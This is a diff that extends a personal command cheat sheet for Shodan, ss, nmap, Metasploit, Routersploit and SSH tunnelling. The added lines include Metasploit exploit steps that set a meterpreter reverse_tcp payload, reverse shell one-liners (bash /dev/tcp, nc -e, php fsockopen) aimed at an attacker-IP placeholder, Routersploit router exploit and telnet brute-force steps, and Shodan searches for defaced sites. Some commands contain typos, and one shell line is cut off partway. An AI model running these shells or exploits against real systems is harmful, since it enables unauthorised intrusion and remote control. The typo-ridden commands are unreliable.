@@ -11,6 +11,7 @@ Commands
   nmap -Pn -sI host.com zombiehost.com domain.com   # normal, idle
   shodan convert mongodbdb.json.gz csv
   shodan convert nging-sample.json.gz xlsx
+  shodan count http.compenent:bootstrap
   shodan download --limit -1 hacked-sites.json.gz 'title:"hacked by"'
   shodan download --limit 200 nginx-sample product:nginx
   shodan download -h
@@ -21,7 +22,9 @@ Commands
   shodan parse --fields ip_str,port,title hacked-sites.json.gz
   shodan parse --fields ip_str, hacked-sites.json.gz
   shodan parse -f location.country_code:US a.json.gz -O ab.json.gz
-  shodan parse ab.json.gz --fields ip_str,port,hosnames,location.country
+  shodan parse ab.json.gz --fields ip_tr,port,hosnames,location.country
+  shodan parse --fields title hacked.json.gz | grep -r "hacked by" | 
+sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
   shodan radar
   shodan scan submit --filename scandata 192.20.20.0/24
   shodan stats --facets telnet.option --limit 20 port:23
@@ -32,6 +35,7 @@ Commands
   shodan stats --facets org country:de ssl.version:sslv2
   shodan stats --facets ssh.fingerprint port:22
   shodan stats e7:86:c7:22:b3:08:af:c7:11:fb:a5:ff:9a:ae:38:e4
+  shodam stream --datadir data --limit 1000 --quiet  # online streaming
   shodan search --fields ip_str,port,title 'title:"hacked by"'
   shodan search port:23 telnet.option:com_port_option
   shodan search e7:86:c7:22:b3:08:af:c7:11:fb:a5:ff:9a:ae:38:e4
@@ -57,11 +61,77 @@ Network Bandwitch
   sudo netwatch -e eth0 -nt # between local host and remote hosts
   sudo pktstat -i eth0 -nt  # active connections, type;
   sudo trafshow -i eth0 tcp # active conections, type
+  top -d 1.0 -b | grep Cpu
   vnstat -l -i eth0   # runs in background service/daemon
 
 Network Connections
   ss | less  # list all connections
   ss -tux  # ss -A tcp - filter tcp,udp or unix connections
+  ss -a -A udp  # all, All tests
+  ss -lntp # listening;not resolve ip or portl; tcp; process name
+  ss -s  # statistics
+  ss -tn -o   # o time information
+  ss -tl -f inet    # inet or -4
+  ss -tl6
+  ss -t4 state established   # time-wait;syn-sent;syn-recv;all;connected;
+     # synchronized; bucket - minisockets, bug - opposite to bucket
+  ss -at '( dport = :ssh or sport = :ssh )'  # filter by add and port
+  ss -nt '( dst :443 or dst :80 )' # sockets with destinations port
+  ss -nt src 127.0.0.1 sport gt :5000
+  watch -n 1 "ss -t4 state syn-sent"
+
+Nmap
+  --send-eth/send-ip  # send using raw ethernet frames or ip packets
+  --script "http-*"   # Scripts with wildcard
+  --source-port <number>
+  --stats-every <time>
+  --open --reason   # return only open services and reason why
+  --data-lenght 0   # 0 for random or protocol-specific payload
+  --randomize-hosts  # default is sequential hosts
+  --data hex string  # append custom binary data to sent packets
+  --initial-rtt-timeout 250ms --max-retries 2 --host-timeout 15m
 
 
+Metasploit Framework
+  msfconsole
+  search exploit_name
+  use exploits/path/to/exploit
+  show options
+  set RHOST <target.ip>
+  set payload windows/meterpreter/reverse_tcp
+  set lhost <our.machine>
+  set lport <our.port>
+  exploit
+
+Metasploit Payload
+  # https://www.offensive-security.com/metasploit-unleashed/msfpayload/
+  msfpayload -l
+  msfpayload windows/shell_bind_tcp 0
+  # changing exit technique listening port;output as C,Perl,Raw
+  msfpayload windows/shell_bind_tcp EXITFUNC=seh LPORT=1234 0 C
+
+Reverse Shells
+  bash -i >& /dev/tcp/<attackerip>/<port> 0>&1
+  nc -e /bin/sh <attackerip> <port>
+  php -r '$sock=fsockopen("<attackip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+  rm /tmp/f;mkfifo /tmp/f;cat
+
+Routersploit
+  git clone https://github.com/reverse-shell/routersploit
+  cd routersploit  && ./rsf.py # it starts "rsf >"
+  use exploits/dlink/dcs_930l_auth_rce
+  show options
+  set target 192.168.1.1
+  run   # to run exploit
+  use scanners/cisco_scan
+  show options
+  set target 192.168.1.1
+  use creds/telnet_bruteforce
+  show options
+  set target 192.168.1.1
+  run
+
+SSH Tunnelling
+  ssh -f -N -L <source>:<port>:<dest>:<port> user@relay # execute from source
+  ssh -f -N -R <source>:<port>:<dest>:<port> user@relay # execute from dest
 
